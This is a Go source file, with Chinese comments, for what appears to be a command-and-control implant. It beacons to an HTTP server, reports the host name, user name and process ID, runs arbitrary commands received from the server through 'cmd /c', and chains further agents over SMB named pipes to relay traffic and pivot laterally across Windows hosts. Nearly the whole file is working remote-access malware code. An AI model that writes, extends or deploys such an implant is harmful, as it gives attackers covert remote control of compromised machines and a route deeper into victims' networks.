package main

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"sync"
	"time"

	"github.com/Microsoft/go-winio"
)

// --- 协议常量 ---
const (
	CMD_EXEC     = 0x01
	CMD_SMB      = 0x02
	CMD_FORWARD  = 0x03
	CMD_REGISTER = 0x04
	CMD_ACK      = 0x05
)

// --- Agent ---
type Agent struct {
	AgentID    uint32
	ServerURL  string
	Children   sync.Map // Map[uint32]*NamedPipe
	OutBuffer  bytes.Buffer
	BufferLock sync.Mutex
}

// --- 主逻辑 ---
func main() {
	rand.Seed(time.Now().UnixNano())
	agentID := uint32(rand.Intn(100000))
	agent := &Agent{
		AgentID:   agentID,
		ServerURL: "http://localhost:8080/api/beat",
	}

	// 注册
	agent.QueuePacket(CMD_REGISTER, collectMetadata(agentID))
	fmt.Printf("[+] Gateway Started ID: %d\n", agentID)

	for {
		agent.CheckIn()
		time.Sleep(2 * time.Second)
	}
}

func (a *Agent) CheckIn() {
	a.BufferLock.Lock()
	data := a.OutBuffer.Bytes()
	a.OutBuffer.Reset()
	a.BufferLock.Unlock()

	req, _ := http.NewRequest("POST", a.ServerURL, bytes.NewReader(data))
	req.Header.Set("X-Agent-ID", fmt.Sprintf("%d", a.AgentID))

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	r := bytes.NewReader(body)
	for r.Len() > 0 {
		header := make([]byte, 4)
		if _, err := r.Read(header); err != nil {
			break
		}
		length := binary.BigEndian.Uint32(header)
		pkt := make([]byte, length)
		if _, err := r.Read(pkt); err != nil {
			break
		}
		go a.HandleCommand(pkt[0], pkt[1:])
	}
}

func (a *Agent) HandleCommand(cmd byte, payload []byte) {
	switch cmd {
	case CMD_ACK:
		fmt.Printf("[*] Received ACK from upstream\n")
	case CMD_EXEC:
		out := RunCmd(string(payload))
		a.QueuePacket(CMD_EXEC, []byte(out))
	case CMD_SMB:
		// 收到: link <target_pipe>
		// payload 即 pipe path, e.g. \\.\pipe\pivot1
		path := string(payload)
		go a.ConnectPivot(path)
	case CMD_FORWARD:
		// [RouteID 4][InnerPacket...]
		if len(payload) < 4 {
			return
		}

		routeID := binary.BigEndian.Uint32(payload[0:4])
		inner := payload[4:]

		// 方式B：带索引的十六进制
		for i, b := range payload {
			fmt.Printf("data[%d] = 0x%02x (%d)\n", i, b, b)
		}
		println(routeID)
		println(string(inner))
		if val, ok := a.Children.Load(routeID); ok {
			conn := val.(net.Conn)
			// SMB Message Mode: 一次 Write 发送整个包
			conn.Write(inner)
		}
	}
}

func (a *Agent) ConnectPivot(fullPath string) {
	// 设置连接超时
	timeout := 10 * time.Second

	// 连接到命名管道
	conn, err := winio.DialPipe(fullPath, &timeout)
	if err != nil {
		a.QueuePacket(CMD_EXEC, []byte(fmt.Sprintf("[-] SMB Link Failed: %v", err)))
		return
	}

	routeID := uint32(rand.Intn(90000) + 10000)
	a.Children.Store(routeID, conn)

	a.QueuePacket(CMD_EXEC, []byte(fmt.Sprintf("[+] Linked to %s (RouteID: %d)", fullPath, routeID)))

	// 读管道循环
	go func() {
		defer conn.Close()
		defer a.Children.Delete(routeID)

		buf := make([]byte, 1024*1024)
		for {
			// 这里是阻塞读。只要 Pivot 发数据（心跳或回显），这里就会触发
			n, err := conn.Read(buf)
			if err != nil {
				break
			}

			// 收到任何数据，立即封装成 FORWARD 发给 Server
			pkt := buf[:n]
			wrap := make([]byte, 4+len(pkt))
			binary.BigEndian.PutUint32(wrap[0:4], routeID)
			copy(wrap[4:], pkt)

			// 塞进下一次 HTTP 轮询的缓冲区
			a.QueuePacket(CMD_FORWARD, wrap)
		}
	}()
}

func (a *Agent) QueuePacket(cmd byte, payload []byte) {
	a.BufferLock.Lock()
	defer a.BufferLock.Unlock()
	buf := make([]byte, 4+1+len(payload))
	binary.BigEndian.PutUint32(buf[0:4], uint32(1+len(payload)))
	buf[4] = cmd
	copy(buf[5:], payload)
	a.OutBuffer.Write(buf)
}

// --- 辅助函数 ---

func RunCmd(c string) string {
	cmd := exec.Command("cmd", "/c", c)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return err.Error()
	}
	return string(out)
}

func collectMetadata(id uint32) []byte {
	u, _ := user.Current()
	h, _ := os.Hostname()
	meta := map[string]interface{}{
		"agent_id": id, "os": runtime.GOOS, "arch": runtime.GOARCH,
		"hostname": h, "username": u.Username, "process": os.Args[0], "pid": os.Getpid(),
	}
	b, _ := json.Marshal(meta)
	return b
}
